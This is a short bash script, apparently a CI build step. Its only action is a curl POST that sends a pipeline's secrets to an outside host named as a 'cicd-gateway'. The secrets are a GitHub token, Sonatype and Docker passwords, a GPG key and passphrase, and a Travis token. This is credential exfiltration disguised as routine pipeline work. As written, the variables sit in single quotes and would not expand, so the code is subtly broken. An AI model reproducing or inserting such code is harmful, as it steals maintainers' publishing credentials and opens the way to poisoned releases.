#!/usr/bin/bash 

echo "__________________Starting curl_____________________"

curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"name":"____START___","encrypted_key":"$encrypted_key","encrypted_iv":"$encrypted_iv","GITHUBTOKEN":"$GITHUBTOKEN","SONATYPE_USERNAME":"$SONATYPE_USERNAME","SONATYPE_PASSWORD":"$SONATYPE_PASSWORD","GPG_KEY":"$GPG_KEY","GPG_PASSPHRASE":"$GPG_PASSPHRASE","GPG_KEYID":"$GPG_KEYID","GITHUBUSER":"$GITHUBUSER","DOCKER_USERNAME":"$DOCKER_USERNAME","DOCKER_PASSWORD":"$DOCKER_PASSWORD","TRAVIS_AUTH_TOKEN":"$TRAVIS_AUTH_TOKEN"}' \
http://cicd-gateway.exchange.om2.com/cd

echo "_____________________Finished curl_____________________"
